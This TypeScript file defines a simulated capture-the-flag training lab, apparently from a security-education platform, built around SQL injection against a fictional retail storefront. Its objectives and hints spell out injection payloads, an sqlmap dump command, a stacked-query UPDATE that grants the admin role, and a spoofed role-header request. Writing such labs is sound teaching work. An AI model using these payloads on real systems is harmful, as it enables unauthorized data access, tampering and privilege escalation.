import { dir } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

export const databaseIntrusionLabs: LabScenario[] = [
  {
    id: 'web-sqli-stacked-privilege-update',
    title: 'SQL Injection: Stacked-Query Privilege Escalation via UPDATE',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Injection has sat at or near the top of the OWASP Top 10 (A03:2021-Injection) for over a decade, and the ' +
      'real-world cost of an unpatched SQL injection is not hypothetical — TalkTalk\'s 2015 breach, caused by a ' +
      'SQL-injectable web form, exposed roughly 157,000 customers\' data and drew a record £400,000 ICO fine at ' +
      'the time. Aurora Retail\'s product page (shopfront-db02, 10.10.117.2) has exactly that kind of injectable ' +
      '"id" parameter. Most SQLi labs stop at reading data with a UNION dump; this one goes a step further into a ' +
      'more dangerous class of impact — a stacked query (a second statement appended after a `;`) that lets you ' +
      'directly UPDATE a live row in the database, turning a read-only leak into unauthorized data tampering and ' +
      'privilege escalation.',
    objectives: [
      { text: 'nmap -sV 10.10.117.2', why: 'Confirms the web/app stack before probing it — the standard first move against any unknown target.' },
      { text: 'curl "http://10.10.117.2/product?id=1"', why: 'Establishes the normal, benign response shape for the id parameter before attempting to break it.' },
      {
        text: 'sqlmap -u "http://10.10.117.2/product?id=1\' OR \'1\'=\'1" --batch --dump',
        why: 'Confirms the id parameter is genuinely injectable and extracts the first payoff — an admin credential row — exactly the automated confirm-then-dump workflow sqlmap is built for.',
      },
      {
        text: "curl \"http://10.10.117.2/account/promote?id=1; UPDATE users SET role='admin' WHERE username='attacker'--\"",
        why: 'A stacked query — a second, attacker-authored SQL statement appended after a semicolon — is a categorically worse finding than a read-only UNION dump: instead of just reading the database, you are now writing to it, here granting your own account an admin role with a single crafted request.',
      },
      {
        text: 'curl -H "X-User-Role: admin" http://10.10.117.2/admin/dashboard',
        why: 'Reading data and even tampering with a row only matters if you can show real impact — accessing the admin-only dashboard proves the privilege escalation actually works, the difference between "found a bug" and "achieved unauthorized administrative access."',
      },
    ],
    hints: [
      'nmap -sV 10.10.117.2',
      'curl "http://10.10.117.2/product?id=1" — see the normal response first.',
      'sqlmap -u "http://10.10.117.2/product?id=1\' OR \'1\'=\'1" --batch --dump',
      'The id parameter is injectable, and stacked queries are allowed. Try appending a second statement: curl "http://10.10.117.2/account/promote?id=1; UPDATE users SET role=\'admin\' WHERE username=\'attacker\'--"',
      'Now prove the privilege escalation actually granted access: curl -H "X-User-Role: admin" http://10.10.117.2/admin/dashboard',
    ],
    totalFlags: 3,
    attacker: attacker(),
    network: [
      {
        hostname: 'shopfront-db02',
        ip: '10.10.117.2',
        os: 'Ubuntu 22.04 (Node.js + MySQL storefront)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.22.0 (reverse proxy to Node.js app)',
            http: {
              '/': '<html><body><h1>Aurora Retail</h1><p>GET /product?id=&lt;n&gt;</p></body></html>',
            },
            vulnRoutes: [
              {
                kind: 'sqli',
                path: '/product',
                param: 'id',
                triggerSubstrings: ["' or '1'='1", 'or 1=1', 'union select'],
                vulnerableResponse:
                  '{"error":"internal query error","debug_query":"SELECT * FROM products WHERE id=1 OR \'1\'=\'1\'",' +
                  '"leaked_row":{"table":"users","username":"admin","password_hash":"5f4dcc3b5aa765d61d8327deb882cf99"},' +
                  '"note":"flag{sqli_union_dump_admin_password_hash}"}',
                normalResponse: '{"id":1,"name":"Wireless Mouse","price":19.99}',
              },
              {
                kind: 'sqli',
                path: '/account/promote',
                param: 'id',
                triggerSubstrings: ['; update', 'update users', "set role"],
                vulnerableResponse:
                  '{"status":"stacked query executed","debug_query":"1; UPDATE users SET role=\'admin\' WHERE username=\'attacker\'--",' +
                  '"rows_affected":1,"note":"flag{stacked_query_update_grants_admin_role}"}',
                normalResponse: '{"error":"invalid product id"}',
              },
              {
                kind: 'auth-bypass',
                path: '/admin/dashboard',
                param: 'X-User-Role',
                location: 'header',
                triggerSubstrings: ['admin'],
                vulnerableResponse:
                  '{"status":200,"dashboard":"Aurora Retail Admin Control Panel","revenue_total":"$482,910",' +
                  '"note":"flag{privilege_escalation_confirmed_admin_dashboard_access}"}',
                normalResponse: '{"error":"403 Forbidden - admin role required"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
